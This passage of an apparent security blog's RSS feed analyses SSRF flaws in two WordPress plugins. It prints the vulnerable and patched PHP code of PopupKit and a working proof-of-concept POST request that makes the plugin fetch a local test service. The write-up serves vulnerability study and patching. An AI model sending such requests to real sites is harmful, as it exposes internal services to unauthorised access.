3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Broken Link Notifier versions &lt;strong&gt;≤1.3.0&lt;/strong&gt; are vulnerable to &lt;strong&gt;SSRF&lt;/strong&gt;: the endpoint allows anonymous users to supply URLs, which leads to &lt;code&gt;wp_remote_get()&lt;/code&gt; being called against internal services. Version &lt;strong&gt;1.3.1&lt;/strong&gt; added DNS/IP checks and restrictions, preventing SSRF before the request is performed.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Upgrade immediately&lt;/strong&gt; to &lt;strong&gt;≥1.3.1&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Do not trust client-provided URLs&lt;/strong&gt; — validate/allowlist before fetching.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Block internal IPs&lt;/strong&gt; (resolve DNS, block private/reserved ranges).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Restrict endpoint privileges&lt;/strong&gt; (do not allow anonymous).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Return status instead of raw body&lt;/strong&gt; when content is not needed.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/broken-link-notifier/vulnerability/wordpress-broken-link-notifier-plugin-1-3-0-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Broken Link Notifier Plugin &amp;lt;= 1.3.0 is vulnerable to Server Side Request Forgery (SSRF) &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10861 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-27-cve-2025-10861/</link>
      <pubDate>Mon, 27 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-27-cve-2025-10861/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Popup Builder with Gamification, Multi-Step Popups, Page-Level Targeting, and WooCommerce Triggers&lt;/strong&gt; plugin for WordPress is vulnerable to &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; in all versions &lt;strong&gt;up to and including 2.1.4&lt;/strong&gt;.&#xA;The cause is &lt;strong&gt;insufficient validation&lt;/strong&gt; of &lt;strong&gt;URLs&lt;/strong&gt; supplied via the &lt;strong&gt;&lt;code&gt;url&lt;/code&gt;&lt;/strong&gt; parameter.&#xA;This allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to make &lt;strong&gt;web requests&lt;/strong&gt; to &lt;strong&gt;arbitrary addresses&lt;/strong&gt; originating from the web application, which can be used to &lt;strong&gt;query or modify information from internal services&lt;/strong&gt;, as well as &lt;strong&gt;conduct network reconnaissance&lt;/strong&gt;.&#xA;The vulnerability was &lt;strong&gt;partially patched&lt;/strong&gt; in &lt;strong&gt;version 2.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10861&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10861&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/popup-builder-block/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress PopupKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;PopupKit&lt;/strong&gt;: &lt;strong&gt;2.1.3&lt;/strong&gt; (vulnerable) and &lt;strong&gt;2.1.5&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to compare differences between versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Because some source was partially patched in &lt;strong&gt;2.1.4&lt;/strong&gt;, we will analyze using version &lt;strong&gt;2.1.3&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In version &lt;strong&gt;2.1.3&lt;/strong&gt;, the plugin defines a POST API with &lt;code&gt;permission_callback =&amp;gt; __return_true&lt;/code&gt;, allowing &lt;strong&gt;any user&lt;/strong&gt;, including &lt;strong&gt;anonymous users&lt;/strong&gt;, to invoke &lt;code&gt;fetch_external_content()&lt;/code&gt; with a required &lt;code&gt;url&lt;/code&gt; parameter.&#xA;This function uses &lt;code&gt;wp_remote_get&lt;/code&gt; to send a request to the provided URL and returns the response body.&lt;/p&gt;&#xA;&lt;p&gt;Because there is no mechanism to control or filter internal URLs, an attacker can send requests to internal services, leading to &lt;strong&gt;SSRF&lt;/strong&gt; exploitable by &lt;strong&gt;anonymous users&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function get_routes(): array {&#xA;    return [&#xA;        [&#xA;            &amp;#39;endpoint&amp;#39;            =&amp;gt; &amp;#39;/live-preview-template&amp;#39;,&#xA;            &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;            &amp;#39;callback&amp;#39;            =&amp;gt; &amp;#39;fetch_external_content&amp;#39;,&#xA;        ],...&#xA;    ];&#xA;}&#xA;&#xA;public function fetch_external_content( \WP_REST_Request $request ) {&#xA;    $url = $request-&amp;gt;get_param( &amp;#39;url&amp;#39; );&#xA;&#xA;    if ( ! filter_var( $url, FILTER_VALIDATE_URL ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Invalid URL&amp;#39; ), 400 );&#xA;    }&#xA;&#xA;    // Fetch the content using wp_remote_get&#xA;    $new_url  = add_query_arg( &amp;#39;preview&amp;#39;, &amp;#39;true&amp;#39;, $url );&#xA;    $response = wp_safe_remote_get( $new_url );&#xA;    if ( is_wp_error( $response ) ) {&#xA;        return new \WP_REST_Response( array( &amp;#39;error&amp;#39; =&amp;gt; &amp;#39;Error fetching content&amp;#39; ), 500 );&#xA;    }&#xA;    // Return the fetched content&#xA;    $body = wp_remote_retrieve_body( $response );&#xA;    $body = preg_replace( &amp;#39;/type=&amp;#34;[^&amp;#34;]&amp;#43;-text\/javascript&amp;#34;/&amp;#39;, &amp;#39;type=&amp;#34;text/javascript&amp;#34;&amp;#39;, $body );&#xA;    return new \WP_REST_Response( array( &amp;#39;content&amp;#39; =&amp;gt; $body ), 200 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;2.1.5&lt;/strong&gt; fix, the plugin made several changes to mitigate &lt;strong&gt;SSRF&lt;/strong&gt; risk:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Changed the endpoint&lt;/strong&gt; from &lt;code&gt;/live-preview&lt;/code&gt; to &lt;code&gt;/live-preview-template&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Replaced &lt;code&gt;wp_remote_get()&lt;/code&gt; with &lt;code&gt;wp_safe_remote_get()&lt;/code&gt;, which helps WordPress &lt;strong&gt;automatically block requests to internal addresses&lt;/strong&gt; such as &lt;code&gt;localhost&lt;/code&gt;, &lt;code&gt;127.0.0.1&lt;/code&gt;, or &lt;code&gt;169.254.*&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;As a result, user-supplied requests to internal resources on the server are blocked, preventing straightforward SSRF exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;get_routes()&lt;/code&gt; is invoked inside &lt;code&gt;register_routes()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected $namespace = &amp;#39;pbb/v1&amp;#39;;&#xA;&#xA;public function register_routes() {&#xA;    $routes = $this-&amp;gt;get_routes();&#xA;    foreach ($routes as $route) {&#xA;        register_rest_route(&#xA;            $this-&amp;gt;namespace,&#xA;            $route[&amp;#39;endpoint&amp;#39;],&#xA;            [&#xA;                &amp;#39;methods&amp;#39;             =&amp;gt; $route[&amp;#39;methods&amp;#39;],&#xA;                &amp;#39;callback&amp;#39;            =&amp;gt; [$this, $route[&amp;#39;callback&amp;#39;]],&#xA;                &amp;#39;permission_callback&amp;#39; =&amp;gt; isset($route[&amp;#39;permission_callback&amp;#39;])&#xA;                    ? $route[&amp;#39;permission_callback&amp;#39;]&#xA;                    : [$this, &amp;#39;permission_callback&amp;#39;],&#xA;            ]&#xA;        );&#xA;    }&#xA;}&#xA;&#xA;public function permission_callback(): bool {&#xA;    return current_user_can(&amp;#39;manage_options&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When &lt;code&gt;register_routes()&lt;/code&gt; runs, all routes returned by &lt;code&gt;get_routes()&lt;/code&gt; are registered with the WordPress REST API via &lt;code&gt;register_rest_route()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Here:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Each route maps to an &lt;code&gt;endpoint&lt;/code&gt;, &lt;code&gt;method&lt;/code&gt;, and &lt;code&gt;callback&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If a route lacks a &lt;code&gt;permission_callback&lt;/code&gt;, the plugin defaults to &lt;code&gt;$this-&amp;gt;permission_callback&lt;/code&gt;, requiring the &lt;code&gt;manage_options&lt;/code&gt; capability (typically admin).&lt;/li&gt;&#xA;&lt;li&gt;However, in &lt;strong&gt;2.1.3&lt;/strong&gt;, the &lt;code&gt;/live-preview&lt;/code&gt; route is explicitly declared with &lt;code&gt;permission_callback =&amp;gt; &#39;__return_true&#39;&lt;/code&gt;, which &lt;strong&gt;bypasses the permission check&lt;/strong&gt;, allowing anyone (including anonymous users) to call that API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;When a &lt;strong&gt;POST&lt;/strong&gt; request is sent to &lt;code&gt;/wp-json/pbb/v1/live-preview&lt;/code&gt;, &lt;code&gt;fetch_external_content()&lt;/code&gt; executes. It reads the &lt;code&gt;url&lt;/code&gt; parameter from the request, performs a &lt;strong&gt;fetch request&lt;/strong&gt; to that address, and returns the &lt;strong&gt;response body&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Create a simple local service using Python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Send a POST request to the endpoint&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/pbb/v1/live-preview HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;&#xA;url=http://localhost:8001/metadata&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-27-cve-2025-10861/result.png&#34; title=&#34;Content read from local service&#34; 